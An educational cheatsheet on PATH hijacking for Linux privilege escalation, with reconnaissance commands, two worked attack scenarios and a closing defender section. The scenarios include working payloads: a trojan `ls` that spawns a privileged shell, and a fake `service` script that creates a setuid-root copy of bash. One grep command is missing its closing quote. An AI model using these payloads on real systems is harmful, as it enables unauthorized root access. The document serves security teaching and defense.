## 🍕 Cheatsheet: PATH Variable Hijacking

The `$PATH` environment variable is a colon-separated list of directories that the shell searches for executables when a command is issued. PATH hijacking occurs when an attacker modifies the `$PATH` or places a malicious executable in a directory that is searched *before* the directory containing the legitimate program. This tricks a user or a privileged script into running the attacker's code.

### ## What to Look For (Reconnaissance)

An attacker's goal is to find a way to control the execution flow by exploiting how the system searches for binaries.

* **Inspect the Current PATH:**
    ```bash
    echo $PATH
    # Example Output: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/user/bin
    ```
    Pay close attention to the order of directories.

* **Find Writable Directories in the PATH:** Check if you can write to any of the listed directories. A world-writable directory is a major vulnerability.
    ```bash
    # Check each directory from the PATH output
    ls -ld /usr/local/sbin
    ls -ld /usr/local/bin
    # etc.
    ```

* **Look for `.` (Current Directory) in the PATH:** This is a classic misconfiguration. If `.` is in the path, especially at the start, it's highly exploitable.
    ```bash
    echo $PATH | grep -E '(^|:)\.(:|$)
    ```

* **Analyze Scripts:** Look for shell scripts (especially SUID binaries or cron jobs) that call other commands without using an absolute path.
    ```bash
    # Example of a vulnerable line in a script:
    # Instead of /bin/ps, the script just calls "ps"
    ps -ef | grep 'apache'
    ```

---

### ## Common Exploitable Scenarios & Payloads

The core idea is to create a malicious script, name it after a legitimate command, and place it where it will be found first.

#### **Scenario 1: `.` in PATH**
This is a trap for other users, especially `root`.

* **Discovery:** `echo $PATH` shows `.:/usr/local/bin:/usr/bin...`
* **Exploitation:**
    1.  Go to a directory you control, like `/tmp`.
    2.  Create a malicious script and name it after a common command, like `ls`.
        ```bash
        echo '#!/bin/bash' > /tmp/ls
        echo '/bin/bash -p' >> /tmp/ls  # Spawn a root shell
        chmod +x /tmp/ls
        ```
    3.  Wait for an administrator to `cd` into `/tmp` and run the `ls` command. Because `.` is first in their PATH, they will execute your malicious `/tmp/ls` instead of `/bin/ls`.

#### **Scenario 2: Exploiting an SUID Binary**
A privileged binary calls a system command without a full path.

* **Discovery:** You find an SUID binary (e.g., `/usr/local/bin/check-status`) that contains the line `service apache2 status`. The developer forgot to use `/usr/sbin/service`.

* **Exploitation:**
    1.  Create your malicious `service` script in a writable directory like `/tmp`.
        ```bash
        echo '#!/bin/bash' > /tmp/service
        echo 'cp /bin/bash /tmp/rootshell && chmod +s /tmp/rootshell' >> /tmp/service
        chmod +x /tmp/service
        ```
    2.  Prepend `/tmp` to your `$PATH` so the shell looks there first.
        ```bash
        export PATH=/tmp:$PATH
        ```
    3.  Run the vulnerable SUID binary.
        ```bash
        /usr/local/bin/check-status
        ```
    4.  The SUID program, running as root, will execute your `/tmp/service` script. This creates a SUID-root copy of bash in `/tmp`. You can then run `/tmp/rootshell -p` to become root.

---

### ## 🛡️ Detection & Remediation (For Defenders)

#### **How to Detect an Attempt**

* **Process Auditing:** Monitor process execution logs. A root-owned process like `check-status` spawning a shell or another process from `/tmp` is a major indicator of compromise.
* **File System Monitoring:** A user creating an executable file named `ls`, `ps`, or `service` in a non-standard directory like `/tmp` or `/dev/shm` is highly suspicious.

#### **How to Prevent PATH Hijacking**

* **Always Use Absolute Paths in Scripts:** This is the most effective defense. Never rely on the `$PATH`. Always specify the full path for every command in any script, especially those running with elevated privileges.
    ```bash
    # Bad:
    ps -ef | grep 'process'

    # Good:
    /bin/ps -ef | grep 'process'
    ```
* **Define a Safe PATH in Scripts:** At the start of your shell scripts, explicitly set a minimal, secure path. This overrides any potentially malicious `$PATH` inherited from the user's environment.
    ```bash
    #!/bin/bash
    export PATH=/usr/bin:/bin:/usr/sbin:/sbin
    # ... rest of script ...
    ```
* **Sanitize User PATH Variables:** Ensure that user and system-wide shell profiles (`/etc/profile`, `~/.bashrc`, etc.) do not contain dangerous, world-writable directories like `/tmp` or relative paths like `.`.
* **Principle of Least Privilege:** Users should not have write permissions to system-level directories like `/usr/local/bin` or `/sbin`.
